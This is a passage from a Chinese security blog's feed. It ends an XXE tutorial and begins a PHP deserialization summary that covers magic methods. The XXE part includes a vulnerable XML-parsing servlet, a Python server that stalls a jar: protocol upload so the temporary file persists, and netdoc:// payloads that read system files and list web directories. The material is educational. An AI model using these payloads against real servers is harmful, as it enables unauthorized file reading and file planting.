<span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-type">Element</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> document.getDocumentElement();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> element.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">iloop</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; iloop &lt; list.getLength(); iloop++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> list.item(iloop);<br>                <span class="hljs-keyword">if</span> (node.getNodeType() == Node.ELEMENT_NODE) &#123;<br>                    writer.write(node.getNodeName() + <span class="hljs-string">&quot;：&quot;</span><br>                            + node.getTextContent());<br>                &#125;<br>            &#125;<br>            writer.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SAXException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-5.png"></p><p>再用python起个http服务，进行监听</p><p>xxe-jar.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> http.client <span class="hljs-keyword">as</span> httpc<br><br>listen_host = <span class="hljs-string">&#x27;localhost&#x27;</span><br>listen_port = <span class="hljs-number">9999</span><br>jar_file = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRequestHandler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        http_req = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;New connection:&#x27;</span>,self.client_address)<br>        <span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> http_req:<br>            <span class="hljs-keyword">try</span>:<br>                http_req += self.request.recv(<span class="hljs-number">4096</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Client req:\r\n&#x27;</span>,http_req.decode())<br>                jf = <span class="hljs-built_in">open</span>(jar_file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>                contents = jf.read()<br>                headers = (<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.0 200 OK\r\n&#x27;&#x27;&#x27;</span><br>                <span class="hljs-string">&#x27;&#x27;&#x27;Content-Type: application/java-archive\r\n\r\n&#x27;&#x27;&#x27;</span>)<br>                self.request.sendall(headers.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br>                self.request.sendall(contents[:-<span class="hljs-number">1</span>])<br>                time.sleep(<span class="hljs-number">30</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-number">30</span>)<br>                self.request.sendall(contents[-<span class="hljs-number">1</span>:])<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;get error at:&quot;</span>+<span class="hljs-built_in">str</span>(e))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;waiting for connection...&#x27;</span>)<br>    server_thread = threading.Thread(target=jarserver.serve_forever)<br>    server_thread.daemon = <span class="hljs-literal">True</span><br>    server_thread.start()<br>    server_thread.join()<br></code></pre></td></tr></table></figure><p>执行<code>python xxe-jar.py evil.zip</code></p><p><code>evil.zip</code>就是要上传的文件了，不一定要是<code>zip</code>，但是因为<code>jar</code>协议会对文件进行解包操作，如果不上传<code>zip</code>格式文件在报错里是看不到临时文件路径的，所以需要先正常上传一次<code>zip</code>格式文件获取路径然后再上传其他文件</p><p>访问<code>/xxe</code>，<code>post</code>发<code>payload</code></p><p>获取路径<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-7.png"></p><p>上传文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-8.png"></p><p>监听情况，<code>30</code>是延时了<code>30</code>秒<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-6.png"></p><p>至于为什么要延迟，回到<code>jar</code>协议处理文件的过程，因为最后一步会删除临时文件，所以我们就要考虑如何让这个文件能更长时间的停留在我们的系统之中，解决方法是在文件结尾添加一个垃圾字符，然后发送除了最后一个字节的所有数据后进行<code>sleep</code>，这样实际上已经传完了，但是服务器以为没传完，就暂时不会删除临时文件了</p><h2 id="netdoc-协议"><a href="#netdoc-协议" class="headerlink" title="netdoc 协议"></a>netdoc 协议</h2><p><code>Java</code>中<code>netdoc</code>协议可以替代<code>file</code>协议功能，读文件，同时也可以列目录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///c:/windows/system.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">creds</span> <span class="hljs-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;netdoc:///var/www/html/&quot;</span>&gt;</span></span><br><span class="hljs-meta">        ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/xxe-%E6%80%BB%E7%BB%93/">XXE 总结</a><br><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://xz.aliyun.com/t/8041">从几道CTF题学习Blind XXE</a><br><a href="https://jlkl.github.io/2020/08/24/Java_03/">Java XXE 漏洞</a><br><a href="https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-xxe.md">java代码审计-xxe</a><br><a href="https://www.cnblogs.com/SUN99bk/p/11826523.html">XML之DTD</a><br><a href="https://xi4or0uji.github.io/2018/11/29/xxe%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/#XML">xxe漏洞攻击与防御</a><br><a href="https://www.rc.sb/xxe/#%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95">XXE 漏洞总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从XML到XXE&quot;&gt;&lt;a href=&quot;#从XML到XXE&quot; class=&quot;headerlink&quot; title=&quot;从XML到XXE&quot;&gt;&lt;/a&gt;从XML到XXE&lt;/h1&gt;&lt;h2 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="xxe" scheme="https://www.dr0n.top/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化总结</title>
    <link href="https://www.dr0n.top/posts/dad17cf6/"/>
    <id>https://www.dr0n.top/posts/dad17cf6/</id>
    <published>2023-02-10T04:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()： 在创建对象时候初始化对象，一般用于对变量赋初值。<br><span class="hljs-title function_ invoke__">__destruct</span>()： 和构造函数相反，当对象所在函数调用完毕后执行。<br><span class="hljs-title function_ invoke__">__call</span>()： 当调用对象中不存在的方法会自动调用该方法。<br><span class="hljs-title function_ invoke__">__get</span>()： 获取对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__set</span>()： 设置对象不存在的属性时执行此函数。<br><span class="hljs-title function_ invoke__">__toString</span>()： 当对象被当做一个字符串使用时调用。<br><span class="hljs-title function_ invoke__">__sleep</span>()： 序列化对象之前就调用此方法(其返回需要一个数组)<br><span class="hljs-title function_ invoke__">__wakeup</span>()： 反序列化恢复对象之前调用该方法<br><span class="hljs-title function_ invoke__">__isset</span>()： 在不可访问的属性上调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()触发<br><span class="hljs-title function_ invoke__">__unset</span>()： 在不可访问的属性上使用<span class="hljs-keyword">unset</span>()时触发<br><span class="hljs-title function_ invoke__">__invoke</span>()： 将对象当作函数来使用时执行此方法<br></code></pre></td></tr></table></figure><h2 id="construct-amp-destruct"><a href="#construct-amp-destruct" class="headerlink" title="__construct &amp; __destruct"></a>__construct &amp; __destruct</h2><p><code>__construct</code>：在实例化一个对象时，会被自动调用，可以作为非public权限属性的初始化<br><code>__destruct</code>：和构造函数相反，当对象销毁时会调用此方法，一是用户主动销毁对象，二是当程序结束时由引擎自动销毁</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;--------------------\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;abc\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__destruct<br>abc<br>--------------------<br>__construct<br>abc<br>__destruct<br></code></pre></td></tr></table></figure><h2 id="sleep-amp-wakeup"><a href="#sleep-amp-wakeup" class="headerlink" title="__sleep &amp; __wakeup"></a>__sleep &amp; __wakeup</h2><p><code>__sleep</code>：序列化时自动调用<br><code>__wakeup</code>：反序列化时自动调用</p><blockquote><p>如果类中同时定义了 __unserialize()和__wakeup() 两个魔术方法，<br>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p></blockquote><blockquote><p>同理，如果类中同时定义了 __serialize()和 __sleep() 两个魔术方法，<br>则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct\n&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep\n&quot;</span>;<br><span class="hljs-keyword">return</span> [username,password]; <span class="hljs-comment">//需要返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup\n&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin888&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct<br>__sleep<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;&#125;<br>-----------------------------<br>__wakeup<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span>#2 (2) </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;user&quot;</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> =&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;admin888&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="call-amp-callstatic"><a href="#call-amp-callstatic" class="headerlink" title="__call &amp; __callstatic"></a>__call &amp; __callstatic</h2><p><code>__call</code>：对象执行类不存在的方法时会自动调用<code>__call</code>方法<br><code>__callstatic</code>：直接执行类不存在的方法时会自动调用<code>__callstatic</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__call)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callstatic</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不存在&#x27;</span>.<span class="hljs-variable">$method</span>.<span class="hljs-string">&#x27;方法(__callstatic)&#x27;</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">lewiserii</span>();<br>test::<span class="hljs-title function_ invoke__">lewiserii</span>();<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">不存在lewiserii方法(__call)<br>不存在lewiserii方法(__callstatic)<br></code></pre></td></tr></table></figure><h2 id="get-amp-set"><a href="#get-amp-set" class="headerlink" title="__get &amp; __set"></a>__get &amp; __set</h2><p><code>__get</code>：对不可访问属性或不存在属性进行 访问引用时自动调用<br><code>__set</code>：对不可访问属性或不存在属性进行 写入时自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__set\n&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$a</span>-&gt;password;<br><span class="hljs-variable">$a</span>-&gt;password=<span class="hljs-string">&#x27;123456&#x27;</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__get<br>__set<br></code></pre></td></tr></table></figure><h2 id="isset-amp-unset"><a href="#isset-amp-unset" class="headerlink" title="__isset &amp; __unset"></a>__isset &amp; __unset</h2><p><code>__isset</code>：在不可访问的属性上使用<code>inset()</code>时触发<br><code>__unset</code>：在不可访问的属性上使用<code>unset()</code>时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__unset\n&quot;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>-&gt;password);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>-&gt;psd);<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">__isset<br>__unset<br></code></pre></td></tr></table></figure><h2 id="tostring"><a href="#tostring" class="headerlink" title="__tostring"></a>__tostring</h2><p><code>__toString()</code>：类的实例和字符串拼接或者作为字符串引用时会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;admin888&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;tostring&quot;</span>;<br>&#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">tostring<br></code></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p><code>__invoke()</code>：将对象当作函数来使用时调用此方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span 